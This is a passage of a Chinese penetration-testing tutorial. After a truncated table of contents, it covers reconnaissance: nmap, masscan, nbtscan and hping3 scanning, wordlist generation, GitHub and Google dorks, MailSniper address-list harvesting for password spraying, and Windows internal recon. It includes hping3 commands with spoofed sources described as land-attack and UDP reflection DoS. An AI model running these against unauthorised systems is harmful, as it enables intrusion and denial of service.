免杀技术之生成shellcode自行编译</a></li><li><a href="#9120__2094">9.1.20 免杀技术之代码加密</a></li><li><a href="#9121_cmeterpreter_2102">9.1.21 免杀技术之使用c实现meterpreter功能</a></li><li><a href="#9121_360_2112">9.1.21 白加黑免杀过360开机启动拦截</a></li><li><a href="#9122_c_2118">9.1.22 使用c#实现简单的分离免杀</a></li><li><a href="#92_C2_2127">9.2 命令与控制-C2（简单理解）</a></li></ul><li><a href="#_2139">十、安全工具教学</a></li><ul><li><a href="#101_Impacket_2140">10.1 Impacket套件之远程命令执行功能讲解</a></li><li><a href="#_2142">前言</a></li><li><a href="#smbexe_2168">smbexe</a></li><li><a href="#atexec_2218">atexec</a></li><li><a href="#wmiexec_2286">wmiexec</a></li><li><a href="#psexec_2324">psexec</a></li><li><a href="#102_bloodhound_2399">10.2 bloodhound技术讲解</a></li><li><a href="#_2401">前言</a></li><li><a href="#_2407">工具使用</a></li><li><a href="#API_2525">目标选择和API使用</a></li><li><a href="#_2889">每种收集方法的目标是什么系统？</a></li><li><a href="#_2933">技术总结</a></li><li><a href="#103_Windows10Kali_2939">10.3 Windows10配置搭建Kali环境</a></li><li><a href="#104_CrackMapExec_2947">10.4 与CrackMapExec结合攻击</a></li><li><a href="#Kali__2952">Kali 安装</a></li><li><a href="#Mac_OSX__2969">Mac OSX 安装</a></li><li><a href="#105_meterpreterirbdayuTwentythird_days_3159">10.5 meterpreter下的irb操作（一）（dayu-Twenty-third days）</a></li><li><a href="#106__payload_3275">10.6 基于第十课补充 payload（一）</a></li><li><a href="#107_payload_3397">10.7 基于第十课补充payload（二）</a></li><li><a href="#108_ldifde__3483">10.8 域信息收集之普通域用户权限获取域里详细信息-ldifde 工具</a></li><li><a href="#109_csvde_3501">10.9 域信息收集-csvde工具</a></li><li><a href="#1010_XSSBee_3517">10.10 XSS之Bee神器</a></li><li><a href="#1011_%09Pstools__3583">10.11 	Pstools 讲解</a></li><li><a href="#1012_Netcat_3919">10.12 Netcat使用总结</a></li><li><a href="#1013_POC_3929">10.13 如何自己动手编写漏洞POC</a></li></ul><li><a href="#_3938">十一、红队技巧</a></li><ul><li><a href="#111_Msbuildexepayload_3939">11.1 基于白名单Msbuild.exe执行payload（一）</a></li><li><a href="#112_Installutilexepayload_4077">11.2 基于白名单Installutil.exe执行payload（二）</a></li><li><a href="#113_Regasmexepayload_4227">11.3 基于白名单Regasm.exe执行payload（三）</a></li><li><a href="#114_Regsvcsexepayload_4366">11.4 基于白名单Regsvcs.exe执行payload（四）</a></li><li><a href="#115_MshtaexepayloaddayuTwentyfourth_days_597">11.5 基于白名单Mshta.exe执行payload（五）（dayu-Twenty-fourth days）</a></li><li><a href="#116_Compilerexepayload_646">11.6 基于白名单Compiler.exe执行payload（六）</a></li><li><a href="#117_Cscexepayload_999">11.7 基于白名单Csc.exe执行payload（七）</a></li><li><a href="#118_Msiexecpayload_1263">11.8 基于白名单Msiexec执行payload（八）</a></li><li><a href="#119_Regsvr32payload_1302">11.9 基于白名单Regsvr32执行payload（九）</a></li><li><a href="#1110_%09Wmicpayload_1453">11.10 	基于白名单Wmic执行payload（十）</a></li><li><a href="#1111_Rundll32exepayload_1744">11.11 基于白名单Rundll32.exe执行payload（十一）</a></li><li><a href="#1112_Odbcconfpayload_2022">11.12 基于白名单Odbcconf执行payload（十二）</a></li><li><a href="#1113_PsExecpayload_2116">11.13 基于白名单PsExec执行payload（十三）</a></li><li><a href="#1114_Forfilespayload_2195">11.14 基于白名单Forfiles执行payload（十四）</a></li><li><a href="#1115_Pcaluapayload_2281">11.15 基于白名单Pcalua执行payload（十五）</a></li><li><a href="#1116_Msiexecpayload_2353">11.16 基于白名单Msiexec执行payload（八）补充</a></li><li><a href="#1117_Cmstpexepayload_2431">11.17 基于白名单Cmstp.exe执行payload（十六）</a></li><li><a href="#1118_Urldllpayload_2702">11.18 基于白名单Url.dll执行payload（十七）</a></li><li><a href="#1119_zipfldrdllpayload_2796">11.19 基于白名单zipfldr.dll执行payload（十八）</a></li><li><a href="#1120_Ftpexepayload_2882">11.20 基于白名单Ftp.exe执行payload（十九）</a></li></ul><li><a href="#_2971">十二、工具优化分享</a></li><ul><li><a href="#121_Msfvenom_2972">12.1 解决Msfvenom命令自动补全</a></li><li><a href="#122_Thebackdoorfactory_3420">12.2 The-backdoor-factory-工具介绍</a></li><li><a href="#123_VeilEvasiondayuTwentyfifth_days_3493">12.3 Veil-Evasion-工具介绍（dayu-Twenty-fifth days）</a></li><li><a href="#124_CyberChef_3622">12.4 离线CyberChef使用指南</a></li></ul><li><a href="#_3633">十三、红队案例分析</a></li><ul><li><a href="#131_Regsvr32_ole_3634">13.1 某次项目技术点实录-Regsvr32 ole对象</a></li><li><a href="#132_Access_Token___3854">13.2 阿里云Access Token问题 - 项目收获记录</a></li><li><a href="#133__4030">13.3 从打点到域控的练习</a></li><li><a href="#134_bypassdayutwentysixth_days_4034">13.4 安防软件bypass绕过实例（dayu-twenty-sixth days）</a></li><li><a href="#135_DockerDocker_4118">13.5 Docker常用命令与Docker逃逸漏洞复现</a></li><li><a href="#136__4161">13.6 渗透沉思录</a></li><li><a href="#137__4190">13.7 项目回忆：体系的本质是知识点串联</a></li><li><a href="#138_FridaAPP_4332">13.8 Frida在APP远程加解密中的应用</a></li><li><a href="#139_OracleRAC_4336">13.9 漏洞修复系列之Oracle远程数据投毒漏洞修复(非RAC环境)</a></li><li><a href="#1310_ueditorgetshell_4346">13.10 记一次ueditor老版本的非常规getshell</a></li><li><a href="#1311__gameapp_4381">13.11 “数字经济”云安全共测大赛初赛 gameapp题目解析</a></li><li><a href="#1312_CFS_4432">13.12 CFS三层靶机搭建及其内网渗透-附靶场环境</a></li><li><a href="#1313__4750">13.13 记一次简单的漏洞利用与横向</a></li><li><a href="#1314_CVE201912757_Symantec_Endpoint_Protection__4767">13.14 CVE-2019-12757: Symantec Endpoint Protection 中的本地特权升级</a></li><li><a href="#1315_SQL_Server_CLR_4779">13.15 攻击SQL Server CLR程序集</a></li><li><a href="#1316__5135">13.16 蜜罐之家分享</a></li><li><a href="#1317_Cobalt_StrikeWindowsDefender_5145">13.17 Cobalt Strike使用混淆绕过WindowsDefender</a></li><li><a href="#1318__5155">13.18 渗透实战从打点到域控的全过程</a></li><li><a href="#1319_Docker_5159">13.19 Docker极速入门</a></li><li><a href="#1320__5166">13.20 记一次应急响应样本分析</a></li></ul><li><a href="#_5171">持续添加更新中...直到写不动为止！</a></li></ul></ul></div><p></p>

<hr color="#000000" size="1&quot;">
<h1><a id="_22"></a>一、信息收集</h1>
<h2><a id="1_24"></a>1、主机发现</h2>
<h2><a id="nmap_26"></a>nmap</h2>
<p>官网: https://nmap.org/<br>
安装系统及命令:<br>
Mac os: brew install nmap<br>
Centos: yum install nmap<br>
Ubuntu: apt一get install nmap</p>
<p>参考手册: https://nmap.org/man/zh/index.html</p>
<p><strong>扫描方式</strong><br>
常见的七种扫描方式：<br>
ТСР: -sT<br>
SYN: -sS<br>
ACK: -sA<br>
UDP: -sU<br>
RPC: -sR<br>
ICMP: -sP<br>
Disable Port Scan: -sn<br>
最常见的这些参数解释：https://blog.csdn.net/liudongdong19/article/details/83506731</p>
<p><strong>常见扫描案例</strong><br>
扫描10000端口、操作系统、版本</p>
<pre><code>nmap -T4 -A &lt;target&gt;
</code></pre>
<p>版本探测</p>
<pre><code>nmap -sV &lt;target&gt;
</code></pre>
<p>操作系统</p>
<pre><code>nmap -O &lt;target&gt;
</code></pre>
<p>其他常用技巧：</p>
<pre><code>--host-timeout 主机超时时间 通常选值：18000
--scan-delay 报文时间间隔 通常选值：1000
-s &lt;源地址&gt; 定义扫描源地址，为了不被发现
</code></pre>
<p><strong>示例</strong><br>
nmap -V -iR 100000 -PO -p 80<br>
随机选择100000台主机扫描是否运行Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-PO禁止对主机列表。</p>
<pre><code>host -l company.com | cut -d -f 4 | nmap -V -iL -
</code></pre>
<p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给Nmap。上述命令用于GNU/Linux —— 其它系统进行区域传输时有不同的命令。</p>
<p><strong>输出</strong></p>
<pre><code>-oN &lt;File&gt;
-oX &lt;XML File&gt;
-oG &lt;filespec&gt;
参考：http://www.unspecific.com/nmap-oG-output/
</code></pre>
<hr>
<h2><a id="Masscan_89"></a>Masscan</h2>
<p>项目地址: https://github .com/robertdavidgraham/masscan<br>
安装:<br>
$ sudo apt-get install git gcc make libpcap一dev<br>
$ git clone https://github. com/ rober tdavidgr aham/ masscan<br>
$ cd masscan<br>
$ make</p>
<pre><code>该工具兼容Nmap的参数高级选项
</code></pre>
<p><strong>高级选项</strong><br>
<img src="https://img-blog.csdnimg.cn/20200916142823703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令：<code>sudo masscan --ports 1-10000 192.168.1.4 --adapter-ip 192.168.175.128</code></p>
<pre><code>-adapter-ip 指定发包的IP地址
-adapter-port 指定发包的源端口
-adapter-mac 指定发包的源MAC地址
-router-mac 指定网关的MAC地址
-exclude IP地址范围黑名单，防止masscan扫描
-excludefile 指定IP地址范围黑名单文件
-includefile，-iL 读取一个范围列表进行扫描
-wait 指定发送完包之后的等待时间，默认为10秒
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200916143208458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令：<code>masscan -e eth0 -p 1-65535 --rate 1000 192.168.1.4</code><br>
在网络环境慢的情况下，快速扫描出存在端口与nmap配合</p>
<hr>
<h2><a id="Nbtscan_122"></a>Nbtscan</h2>
<p><img src="https://img-blog.csdnimg.cn/20200916143615387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
kali系统自带nbtscan，以及查看帮助说明<br>
<img src="https://img-blog.csdnimg.cn/20200916144337357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
nbtscan扫描可以发现主机名、MAC addr等信息…</p>
<pre><code>nbtscan -r 192.168.1.0/24
</code></pre>
<p>扫描整个C段</p>
<pre><code>nbtscan 192.168.1.1-100
</code></pre>
<p>扫描一个范围</p>
<pre><code>nbtscan -v -s : 192.168.1.0/24
</code></pre>
<p>以:分割显示结果</p>
<pre><code> nbtscan -f &lt;File&gt;
</code></pre>
<p>从文件读取扫描范围</p>
<p><strong>高级用法</strong><br>
<img src="https://img-blog.csdnimg.cn/20200916145943928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>nbtscan -v -s ' ' 192.168.1.4
nbtscan -v -s ' ' 192.168.1.4 | awk '{print $1}' | uniq
</code></pre>
<hr>
<h2><a id="hping3_161"></a>hping3</h2>
<p>hping3主要测试防火墙的拦截规则，对网络设备进行测试<br>
<strong>常用模式</strong></p>
<pre><code>常用模式
-0 -rawip IP原始报文
-1 -icmp ICMP模式
-2 -udp UDP模式
-8 -scan 扫描模式
-9 -listen 监听模式
</code></pre>
<pre><code>hping3 --scan 1-30,70-90 -S www.baidu.com
</code></pre>
<p>SYN方式扫描主机端口<br>
<img src="https://img-blog.csdnimg.cn/20200916151031519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>sudo hping3 --scan 445,135 -S 192.168.1.4
</code></pre>
<p>可以看到，目标主机回复了: S…A，代表SYN/ACK</p>
<pre><code>hping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c 5
</code></pre>
<p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）</p>
<p><strong>DRDDOS</strong></p>
<pre><code>hping3 -udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5
</code></pre>
<p>基于UDP的DOS</p>
<p><strong>参考</strong></p>
<pre><code>http://0daysecurity.com/articles/hping3_ examples.html    --很详细用法的解释
http://man.linuxde.net/hping3
</code></pre>
<hr>
<h2><a id="2_205"></a>2、关联信息生成</h2>
<p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、拆分、组合<br>
例如:赫尔巴斯亚基国<br>
根据地域习惯、宗教、互联网开放信息等信息进行简要拆分，假设获取的信息如下:</p>
<pre><code>当地人爱好吃橙子
当地人信奉伊斯兰教
IPV4地址开放IP段
相关社交网络公 开的数据库
</code></pre>
<p>根据宗教、习惯、IP地址、 开放数据支持…等，为后续的字典生成、鱼叉、水坑攻击铺下基石</p>
<h2><a id="pydictor_219"></a>字典生成：pydictor</h2>
<p><strong>安装:</strong></p>
<pre><code>git clone https://github.com/LandGrey/pydictor
</code></pre>
<p><strong>生成字典</strong><br>
<img src="https://img-blog.csdnimg.cn/20200916153918859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令：<code>python pydictor.py --sedb</code></p>
<p><strong>常见的命令：</strong></p>
<pre><code>python pydictor.py --sedb
set cname liwei
set sname lw Lwei
set ename zwell
set birth 19880916
set usedpwd liwei123456. liwei@19880916 lw19880916_123
set phone 18852006666
set uphone 15500998080
set hphone 76500100 61599000 01061599000
set email 33125500@qq.com
set email 13561207878@163.com
set email weiweili@gmail.com
set email wei010wei@hotmail.com
set postcode 663321 962210
set nickname zlili
set idcard 152726198809160571
set jobnum 20051230 100563
set otherdate 19591004 19621012
set otherdate 19870906 19880208
set usedchar tiger gof gamesthrones 176003 m0n5ter ppdog
</code></pre>
<p><strong>常用的组合命令：</strong><br>
合并去重</p>
<pre><code>python pydictor.py -tool uniqbiner /my/all/dict/
</code></pre>
<p>多字典文件组合工具</p>
<pre><code>python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt
</code></pre>
<p>参考详细：https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</p>
<hr>
<h2><a id="3_269"></a>3、开放漏洞情报</h2>
<h2><a id="_271"></a>常用网站</h2>
<pre><code>CVE：https://cve.mitre.org/
Exploit-DB：https://www.exploit-db.com/
CX Security：https://cxsecurity.com/
CNVD：https://www.cnvd.org.cn/
securitytracker：https://www.securitytracker.com/
</code></pre>
<p>**</p>
<h2><a id="Search_ExploitDB_283"></a>Search Exploit一DB</h2>
<p>**<br>
<img src="https://img-blog.csdnimg.cn/20200916160620342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
利用searchsploit apache 5.3.12搜索apache漏洞…这很熟悉了…<br>
<img src="https://img-blog.csdnimg.cn/20200916160848569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令：<code>searchsploit -u</code><br>
更新最新exp库…</p>
<hr>
<h2><a id="4OSINT_294"></a>4、开源情报信息搜集(OSINT)</h2>
<h2><a id="_296"></a>搜索引擎语法</h2>
<pre><code>百度：https://www.baidu.com
谷歌：https://www.google.com
必应：https://cn.bing.com
</code></pre>
<h2><a id="_304"></a>在线接口</h2>
<pre><code>http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com
http://www.webscan.cc/
http://sbd.ximcx.cn/  --在线子域名查询-接口光速版
https://censys.io/certificates?q=.example.com
https://crt.sh/?q=%25.example.com
https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu
https://dnsdumpster.com/  --查询DNS记录、侦查、研究
https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com  --和第一个一样
https://findsubdomains.com/
https://dnslytics.com/search?g=www.baidu.com   --DNSlyrics
https://pentest-tools.com/information-gathering/find-subdomains-of-domain   --DNS攻击面2次免费
https://viewdns.info/   --功能很多
https://www.ipneighbour.com/#/lookup/114.114.114.114      --邻居发现
https://securitytrails.com/list/apex_domain/baidu.com
https://url.fht.im/
http://api.hackertarget.com/hostsearch/?q=baidu.com
http://www.yunsee.cn/finger.html     --云悉（限制挺大）
</code></pre>
<p>有几个挺好用的，自行挖掘…</p>
<h2><a id="_327"></a>相关工具</h2>
<pre><code>https://github.com/rshipp/awesome-malware-analysis/blob/master/恶意软件分析大合集.md
</code></pre>
<p>此网站极力推荐学习！！！</p>
<hr>
<h2><a id="5Github_Hacking_338"></a>5、Github Hacking</h2>
<p>您可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有Github存储库</p>
<pre><code>Repositories 
Topics
Issues and pull requests 
Code 
Commits 
Users 
Wikis 
</code></pre>
<p>参考 :</p>
<pre><code>Searching for repositories 
Searching topics
Searching code 
Searching commits 
Searching issues and pull requests 
Searching users 
Searching wikis 
Searching in forks 
</code></pre>
<p>可以使用以上方式搜索页面或高级搜索页面搜索Github<br>
您可以使用&gt;，&gt;=，&lt;，和&lt;搜索是大于，大于或等于，小于和小于或等于另一个值的值<br>
下面会介绍如何搜索</p>
<p><strong>搜索仓库</strong></p>
<pre><code>
&gt;_n    		cats stars:&gt;1000匹配关键字"cats"且star大于1000的仓库 

&gt;=_n_       cats topIcs:&gt;=5匹配关键字"cats"且标签数量大于等于5的仓库 

&lt;_n_     	cats size:&lt;10000匹配关键字"cats"且文件小于10KB的仓库 

&lt;=_n_    	cats stars:&lt;=50匹配关键字"cats"且star小于等于50的仓库 

_n_..*	 	cats stars:10..*匹配关键字"cats"且star大于等于10的仓库 

*.._n_		cats stars:*..10匹配关键字"cats"且star小于等于10的仓库 

n..n 		cats stars:10..50匹配关键字"cats"且star大于10且小于50的仓库
</code></pre>
<h2><a id="_387"></a>搜索代码</h2>
<p><strong>注意事项</strong></p>
<pre><code>只能搜索小于384KB的文件 
只能搜索少于500,000个文件的存储库，登录的用户可以搜索所有公共存储库
除filename搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索language: Javascript无效,而是这样: amazing language:Javascript 
搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。您不能将以下通配符用作搜索查询的一部分“.、! " = * ! ? # $ &amp; + ^ | ~ &lt;  &gt; ( ) { } [ ] 搜索将忽略这些符号
</code></pre>
<p><strong>日期条件</strong></p>
<pre><code>cats pushed:&lt;2012-07-05 搜索在2012年07月05日前push代码，且cats作为关键字
cats pushed:2016-04-30..2016-07-04  日期区间
cats created:&gt;=2017-04-01  创建时间
</code></pre>
<p><strong>逻辑运算</strong></p>
<pre><code>AND、OR、NOT
</code></pre>
<p><strong>排除运算</strong></p>
<pre><code>cats pushed:&lt;2012-07-05 language:java  搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库
</code></pre>
<p><strong>包含搜索</strong></p>
<pre><code>cats in:file			搜索文件中包含cats的代码
cats in:path			搜索路径中包含cats的代码 
cats in:path,file		搜索路径、文件中包含cats的代码
console path:app/public language:javascript  搜索关键字 console，且语言为javascript，在app/public下的代码
</code></pre>
<p><strong>主体搜索</strong></p>
<pre><code>user: USERNAME								用户名搜索
org: ''ORGNAME									组织搜索 
repo: USERNAME/REPOSITORY		指定仓库搜索 
</code></pre>
<p><strong>文件大小</strong></p>
<pre><code>size:&gt;1000		搜索大小大于1KB的文件 
</code></pre>
<h2><a id="_438"></a>搜索案例</h2>
<p>filename:config.php language:php		搜索文件名为 config.php，且语言为php的代码<br>
<img src="https://img-blog.csdnimg.cn/20200917112817153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>搜索Java项目配置文件: 	mail filename:.properties<br>
<img src="https://img-blog.csdnimg.cn/20200917112655292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
搜索extension:yaml mongolab.com 中存在的代码信息等<br>
<img src="https://img-blog.csdnimg.cn/20200917112903829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="_447"></a>自动化工具</h2>
<pre><code>https://github.com/unkl4b/gitmIner
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917113037733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
example使用即可，非常好用</p>
<pre><code>https://github.com/techgaun/github-dorks  详细介绍github hacking 搜索利用代码以及方法！！
</code></pre>
<hr>
<h2><a id="6google_hacking_460"></a>6、google hacking</h2>
<p><img src="https://img-blog.csdnimg.cn/20200917114133402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>用法</strong></p>
<pre><code>Intitle 			包含标题 
Intext  			包含内容 
filetype 			文件类型 
Info 				基本信息 
site 				指定网站 
inurl 				包含某个url
link 				包含指定链接的网页 
cache 				显示页面的缓存版本
numberange			搜索一个数字
</code></pre>
<p><strong>示例</strong><br>
搜索目标包含后台的页面<br>
<img src="https://img-blog.csdnimg.cn/20200917114436211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令：<code>inurl:/admin intext: 后台管理系统</code></p>
<pre><code>site:"some-keywords.com"intitle: login intext: intext: 管理|后台|登陆|用户名|密码|验证码|系统|帐号| manage|admin|login|system
</code></pre>
<p>搜索目标是否有目录列表<br>
<img src="https://img-blog.csdnimg.cn/20200917115125325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200917115229301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可看到存在目录列表很多url<br>
命令：<code>intext: index of / | ../ | Parent Directory</code></p>
<pre><code>site:"some-keywords.com" intext: index of / | ../ | Parent Directory
</code></pre>
<hr>
<h2><a id="7Gitallsecret_494"></a>7、Git-all-secret</h2>
<p><strong>特性</strong></p>
<p>可以添加自己的正则表达式,在 docker run的时候使用-V</p>
<p>(pwd)/ rules. json; /root/truffleHog/rules. json。可以使用默认正则表达式,如果需要,也可以用truffleHog提供的高熵字符串。可以通过repo- supervisor工具搜索s和json中的高熵字符串。可以搜索用户的Gist,大多数工具都没这个功能。有新工具可以很容易地集成到 git-all-secrets。支持扫描企业 Github orgs/ users/repos/ gists。大多数工具只扫描单个仓库,gtal- secrets可以一次扫描多个…</p>
<p>需要在docker环境下安装，我跳过了这个，以后有精力查看！</p>
<hr>
<h2><a id="8mailsniperps1outlook_507"></a>8、mailsniper.ps1获取outlook所有联系人</h2>
<p><strong>条件</strong></p>
<p>掌握其中一个用户邮箱的账号密码，并且可以登录outlook<br>
outlook地址可以是官方的也可以是目标自己搭建的，并无影响</p>
<p><strong>目的</strong></p>
<p>获取目标邮箱里的所有联系人，方便后续爆破弱口令等等</p>
<p><strong>利用</strong></p>
<p>将尝试 Outlook Web Access（OWA）和Exchange Web服务（EWS）的方法。此命令可用于从Exchange收集电子邮件列表 ：</p>
<pre><code>Get-GlobalAddressList -ExchHostname "outlook地址” -UserName “域名/域用户名” -Password “密码” -OutFile global-address-list.txt
</code></pre>
<p><strong>可以自己搭建目标outlook在自己服务器上</strong></p>
<p>此处使用kion的域环境模拟<br>
在mailsniper. ps1最后一行加入以下代码,也可以通过传参的形式调用</p>
<pre><code>Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt
</code></pre>
<p>尝试使用我们传递的账号密码去登录目标的outlook，成功登录后会把邮件里的联系人都获取下来，并输出保存到文件里</p>
<p>如果outlook在Office365上道理也是一样的，把ExchHostname指向outlook.office365.com即可，username使用完整的邮箱不要是用户名即可</p>
<pre><code>Get-GlobalAddressList -ExchHostname outlook.office365.com -Username 用户名@邮箱.....
</code></pre>
<p><strong>参考链接</strong></p>
<pre><code>https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/
https://www.cnblogs.com/backlion/p/6812690.html
</code></pre>
<p><strong>工具地址</strong></p>
<pre><code>https://github.com/dafthack/mailsniper
</code></pre>
<hr>
<h2><a id="9_555"></a>9、内网渗透之信息收集</h2>
<h2><a id="Windows_557"></a>Windows（工作者和域）</h2>
<p><strong>检查当前shell权限</strong></p>
<pre><code>whoami /user &amp; whoami /priv
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917143444171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查看系统信息</strong></p>
<pre><code>systeminfo
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917143704193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
收集信息主机名-&gt;扮演角色</p>
<p><strong>Tcp/udp 网络连接状态信息</strong></p>
<pre><code>netstat -ano
</code></pre>
<p>可以获取内网IP分布状态-服务（redis)<br>
<img src="https://img-blog.csdnimg.cn/20200917143933693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查看机器名</strong></p>
<pre><code>hostname
</code></pre>
<p><strong>查看当前操作系统</strong></p>
<pre><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version 
ver
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917144314500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查杀软</strong></p>
<pre><code>WMIC	/Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917145142800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查看当前安装的程序</strong></p>
<pre><code>wmic product get name,version
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020091714553252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查看在线用户</strong></p>
<pre><code>quser   							windwos7命令
net config workstation				windwos10命令/查看当前域
</code></pre>
